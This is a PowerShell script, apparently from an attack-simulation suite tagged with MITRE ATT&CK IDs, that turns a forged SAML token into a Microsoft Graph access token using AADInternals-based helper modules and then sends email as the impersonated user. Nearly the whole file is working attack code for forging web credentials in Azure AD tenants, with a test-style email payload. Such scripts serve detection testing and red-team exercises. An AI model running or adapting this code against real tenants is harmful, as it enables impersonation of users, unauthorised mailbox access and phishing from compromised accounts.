<#
.SYNOPSIS
This part of the attack uses a forged SAML token and exchanges it for an access token

.DESCRIPTION
TA0006: Credential Access
T1606.002: Forge Web Credentials - SAML Tokens
1st attack method
#>

# We make use of AADInternals
Get-Module | Where-Object name -eq use-aadtools | Remove-Module -Verbose
Import-Module ../APIs/use-aadtools.psm1
# Environment import tool
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1

# We use the ews environment variables
Import-Environment "graph.env"

# In Linux multi-line read-hosts are very slow:
$prompt = "SAMLToken (from on premises script)"
if ($isLinux -or $isMacOS) {        
    Write-Host -NoNewLine ($prompt + ": ")
    $samlToken = [Console]::ReadLine()
} else {
    $samlToken = Read-Host -Prompt $prompt
}

$scope = "Mail.Send"
#$accessToken = Get-AADIntAccessToken -clientId $env:GRAPH_DELEGATE_CLIENT_ID -Resource "https://graph.microsoft.com" -SAMLToken $samlToken -Tenant $env:TENANT_ID -SaveToCache $True -Verbose
#$accessToken = Get-AADIntAccessToken -clientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.microsoft.com" -SAMLToken $samlToken -Tenant $env:TENANT_ID -SaveToCache $False -Verbose
$accessToken = Get-SAMLAccessToken -clientId $env:GRAPH_DELEGATE_CLIENT_ID -Scope $scope -SAMLToken $samlToken -Tenant $env:TENANT_ID

# Send an email
$url = "https://graph.microsoft.com/v1.0/me/sendMail"
$rand = Get-Random -Minimum 1000 -Maximum 9999

$emailMessage = @{
    "message" = @{
      "subject" = "TA0006 - T1606.002 - A1 - $rand";
      "body" = @{
        "contentType" = "Text";
        "content" = "This is an example email using SAML auth.";
      };
      "toRecipients" = @(
        @{
          "emailAddress" = @{
            "address" = "example@$env:TENANT_ID";
          };
        };
      );
    };
    "saveToSentItems" = $False;
}
$emailMessage = ConvertTo-Json -Depth 99 $emailMessage
Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $emailMessage
